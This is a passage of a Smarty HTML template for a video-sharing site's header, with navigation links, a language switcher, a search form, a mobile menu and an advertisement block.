                                        <i class="icon-fa-channels">
                                        </i>
                                        <span>{translate c='menu.categories'}</span>
                                      </a>
                                      </li>
                                      <li{if $menu=='community' } class="active" {/if}>
                                        <a href="{$relative}/community" title="Community">
                                          <i class="icon-fa-community"></i>
                                          <span>{translate c='menu.community'}</span>
                                        </a>
                                        </li>
                                        <li>
                                          <a href="https://www.5xp168.com" target="_blank" rel="nofollow" title="{t c ='global.website_release'}">
                                            <i class="icon-model"></i>
                                            <span>{t c ='global.website_release'}</span>
                                          </a>
                                        </li>
                                        <li class="nav-dropdown nav-mob-network">
                                        {if $multi_language}
                                           {insert name=languagename assign=name}{insert name=languagename assign=name}
                                          {insert name=languagelang assign=lang}
                                        <span class="item" style="padding: 0px 13px;display: flex;align-items: center;cursor: pointer;"><img class="img-flag" src="/5x/por/img/flags_png/{$lang}.svg" width="20" height="15" alt=""><span>{$name}</span></span><span class="caret"></span>
                                        {/if}
										<ul>
											<li>
                       {foreach from=$languages key=key item=language }
												<a class="change-language" href="#" id="{$key}" style="padding: 12px 14px;display: flex;align-items: center;">
													<img class="img-flag" src="/5x/por/img/flags_png/{$language.lang}.svg" width="20" height="15" alt="">
													<span>{$language.name}</span>
												</a>
                        {/foreach}
                        <form name="languageSelect" id="languageSelect" method="post" action="">
			<input name="language" id="language" type="hidden" value="" />
			</form>

											</li>
										</ul>
									</li>
                    </ul>
                    <ul class="nav-categories">{***修改位置:\include\config.php***} {$suggestion_dh}</ul>
                  </nav>
                </div>
              </div>
            </div>
          </header>
          <div class="wrap-search bg-darker">
            <div class="container">
              <div class="search" itemscope itemtype="http://schema.org/WebSite">
                <meta itemprop="url" content="{$relative}/" />
                <form itemprop="potentialAction" itemscope itemtype="https://schema.org/SearchAction" class="js-search-form form1" id="search_form_xs" action="{$relative}/search/{if !isset($search_type)}videos{else}{$search_type}{/if}" data-url="{$relative}/search/%QUERY%/" name="search" id="search_form" method="post">
                  <meta itemprop="target" content="{$relative}/search/{literal}{q}{/literal}/" />
                  <input class="autocomplete-input" itemprop="query-input" type="search" name="search_query" value="{if isset($search_query)}{$search_query_f}{/if}" id="search_key" placeholder="{t c='ajax.search'} {if isset($search_type) && $search_type == 'photos'} {t c='global.albums'}{elseif isset($search_type) && $search_type == 'users'} {t c='global.users'}{else}{t c='global.videos'}{/if}" name="search_query" id="search_query_xs" value="{if isset($search_query)}{$search_query_f}{/if}">
                  <button type="submit">
                    <span>
                      <i class="icon-search">
                      </i>
                    </span>
                  </button>
                </form>
              </div>
            </div>
          </div>
          <nav class="mobile-nav">
            <ul>
              <li{if $menu=='videos' } class="active" {/if}>
                <a href="{$relative}/videos" title="{translate c='menu.videos'}">{translate c='menu.videos'}</a>
              </li{if $menu=='albums' } class="active" {/if}>
              <li>
                <a href="{$relative}/albums" title="{translate c='menu.photos'}">{translate c='menu.photos'}</a>
              </li>
              <li{if $menu=='blogs' } class="active" {/if}>
                <a href="{$relative}/blogs" title="{translate c='menu.blogs'}">{translate c='menu.blogs'}</a>
                </li>
                <li>
                  <a href="{$relative}/categories" title="{translate c='menu.categories'}">{translate c='menu.categories'}</a>
                </li>
            </ul>
          </nav>
        </div>
      </div>{if $dhx_hf}
      <!---ADV--->
      <div class="ad-index_dx">{literal}
        <style>.ad-index_dx a img {width: 960px;}</style>{/literal} {section name=i loop=$dhx_hf} {$dhx_hf[i].adv_text} {/section}</div>
      <!---ADV--->{/if}
